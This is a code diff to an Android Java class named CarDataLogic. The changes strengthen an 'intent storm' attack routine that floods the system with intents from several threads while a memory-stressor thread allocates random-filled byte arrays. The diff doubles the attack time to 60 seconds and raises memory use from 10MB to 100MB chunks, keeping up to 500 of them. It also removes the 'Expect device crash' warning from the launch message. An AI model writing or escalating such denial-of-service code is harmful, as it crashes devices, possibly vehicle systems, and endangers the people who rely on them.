@@ -2503,13 +2503,13 @@ public class CarDataLogic {
                 thread.start();
             }
 
-            // Schedule attack termination after 30 seconds or when target is reached
+            // Schedule attack termination after 60 seconds or when target is reached
             new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                 isAttacking.set(false);
-                alarmUi("-- ATTACK TERMINATED AFTER 30 SECONDS --");
+                alarmUi("-- ATTACK TERMINATED AFTER 60 SECONDS --");
                 alarmUi("Final Count: " + intentCount.get() + " intents attempted");
                 alarmUi("Device stability: UNKNOWN (may crash any moment)");
-            }, 30000);
+            }, 60000);
 
             // Create memory stressor thread
             new Thread(() -> {
@@ -2518,14 +2518,14 @@ public class CarDataLogic {
                     java.util.List<byte[]> memoryHog = new java.util.ArrayList<>();
                     while (isAttacking.get()) {
                         try {
-                            // Allocate 10MB chunks
-                            byte[] chunk = new byte[10 * 1024 * 1024];
+                            // Allocate 100MB chunks
+                            byte[] chunk = new byte[100 * 1024 * 1024];
                             // Fill with random data
                             new java.util.Random().nextBytes(chunk);
                             memoryHog.add(chunk);
 
-                            // Keep only last 50 chunks to avoid OOM too quickly
-                            if (memoryHog.size() > 50) {
+                            // Keep last 500 chunks to avoid OOM too quickly
+                            if (memoryHog.size() > 500) {
                                 memoryHog.remove(0);
                             }
 
@@ -2569,8 +2569,7 @@ public class CarDataLogic {
             String startMsg = "-- INTENT STORM LAUNCHED --\n" +
                     "Attack ID: " + attackId + "\n" +
                     "Threads: " + THREAD_COUNT + "\n" +
-                    "Target: " + TARGET_INTENTS + " intents\n" +
-                    "Expect device crash within 30 seconds!";
+                    "Target: " + TARGET_INTENTS + " intents";
 
             alarmUi(startMsg);
             android.util.Log.e(TAG, startMsg);
